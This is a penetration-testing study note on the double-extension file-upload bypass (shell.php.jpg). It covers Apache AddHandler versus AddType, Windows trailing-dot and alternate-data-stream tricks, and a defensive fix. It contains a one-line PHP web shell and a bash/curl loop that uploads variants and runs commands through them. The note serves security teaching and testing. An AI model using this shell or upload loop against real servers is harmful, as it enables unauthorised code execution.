---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.05 Double Extension (file.php.jpg)"
---

# 22.05 — Double Extension (file.php.jpg)

## What Is Double Extension?

```
FILENAME WITH TWO EXTENSIONS:
  shell.php.jpg
  
  ATTACKER PERSPECTIVE:
  - Extension check sees: .jpg → "it's an image, allow it!"
  - Server executes based on: which extension wins?
  
  DEPENDS ON SERVER CONFIGURATION:
  Some servers: last extension wins → .jpg → not PHP
  Some servers: ANY extension wins → .php wins → EXECUTES!
  Some: based on Apache AddHandler for PHP
```

---

## When Double Extension Works

```
APACHE AddHandler MISCONFIGURATION:
  Some Apache configs:
  AddHandler application/x-httpd-php .php
  
  This means: "ANY file with .php ANYWHERE in the name → execute as PHP"
  NOT just files ending in .php!
  
  FILE: shell.php.jpg
  → Contains ".php" in name → Apache executes as PHP!
  → Extension check sees ".jpg" → passes!
  
  EXPLOIT:
  Upload: shell.php.jpg (with PHP content)
  Server saves: /uploads/shell.php.jpg
  Visit: https://target.com/uploads/shell.php.jpg?cmd=id
  → PHP EXECUTED!
  
  ALSO:
  shell.php5.jpg → .php5 triggers execution even with .jpg suffix
  malicious.aspx.jpg → if server has issue with ASPX detection
```

---

## How Extension Parsing Works

```
SAFE PARSING (take LAST extension):
  shell.php.jpg → extension = .jpg → not PHP → safe!
  
UNSAFE PARSING (check ALL extensions):
  shell.php.jpg → has .php → execute as PHP → DANGEROUS!
  
APACHE AddHandler vs AddType:
  AddHandler application/x-httpd-php .php
  → Matches on ANY occurrence of .php in filename!
  → shell.php.jpg matches!
  
  AddType application/x-httpd-php .php
  → Only matches files WHERE LAST EXTENSION IS .php
  → shell.php.jpg does NOT match!
  
  TESTING:
  Upload shell.php.jpg → does it execute as PHP?
  → YES = AddHandler (unsafe) or other misconfiguration
  → NO = AddType (safer) or properly configured
```

---

## Testing Double Extension

```bash
# TEST ALL COMBINATIONS:
WEBSHELL='<?php system($_GET["cmd"]); ?>'

# Create test files:
COMBOS=(
  "shell.php.jpg"
  "shell.php.png"
  "shell.php.gif"
  "shell.php5.jpg"
  "shell.phtml.jpg"
  "shell.php.jpeg"
  "shell.php.webp"
  "shell.PHP.jpg"    # case variation
  "shell.jpg.php"    # reverse order (might help if check is on first ext)
)

for FILENAME in "${COMBOS[@]}"; do
  echo "$WEBSHELL" > "$FILENAME"
  echo "Created: $FILENAME"
done

# UPLOAD EACH AND TEST:
UPLOAD_BASE="https://target.com/uploads"
for FILENAME in "${COMBOS[@]}"; do
  echo "Testing: $FILENAME"
  # Upload:
  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -b "session=SESSION" \
    -F "file=@$FILENAME;type=image/jpeg")
  
  # Try to execute:
  EXT_PATH="$UPLOAD_BASE/$FILENAME"
  EXEC_TEST=$(curl -s "$EXT_PATH?cmd=echo+PWNED")
  echo "  Response: $EXEC_TEST" | head -c 100
done

# ALSO TEST: PHP inside valid JPEG structure:
# (Cover image parsing in note 12)
```

---

## Extension Confusion in Windows vs Linux

```
WINDOWS EXTENSION HANDLING:
  Windows ignores characters AFTER a space or dot at end:
  shell.php   → same as → shell.php. (trailing dot stripped)
  shell.php   → same as → shell.php  (trailing space stripped)
  
  UPLOAD: shell.php.  (with trailing dot)
  → Windows saves as: shell.php (strips trailing dot)
  → App validated: ".php." extension → not in blocklist!
  → Saved as: shell.php → executable!
  
  UPLOAD: shell.php (with trailing space: shell.php )
  → Windows saves as: shell.php (strips space)
  
  UPLOAD: shell.php::$DATA (Windows ADS)
  → Alternate Data Stream → saves as: shell.php
  
  MORE WINDOWS TRICKS:
  shell.php:jpg → ADS → saves as shell.php (? server-dependent)
  
  (Most relevant for Windows-hosted apps — IIS, ASP.NET)
```

---

## Fix

```
CORRECT EXTENSION EXTRACTION:

# PYTHON:
from pathlib import Path

def get_extension(filename):
    # Get ONLY the last extension:
    return Path(filename).suffix.lower()  # returns ".jpg", ".png", etc.
    
    # NOT: checking if any part of name contains forbidden extension
    # NOT: checking all extensions in a loop

ALLOWED = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf'}

def validate_upload(filename):
    ext = get_extension(filename)
    if ext not in ALLOWED:
        raise ValueError(f"Extension '{ext}' not allowed")
    return True

# ALSO: Rename to UUID + controlled extension:
import uuid, os
safe_filename = str(uuid.uuid4()) + '.jpg'
# → Even if original was shell.php.jpg → saved as random-uuid.jpg
# → No way to access shell.php.jpg by name!

# APACHE: Use AddType NOT AddHandler:
# BAD:  AddHandler application/x-httpd-php .php
# GOOD: AddType application/x-httpd-php .php
# AND:  Also disable PHP in uploads directory entirely!
```

---

## Related Notes
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — alternative extension bypass
- [[06 - Null Byte Injection (file.php%00.jpg)]] — null byte trick
- [[12 - Image Upload Magic Bytes Bypass]] — combining with magic bytes
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
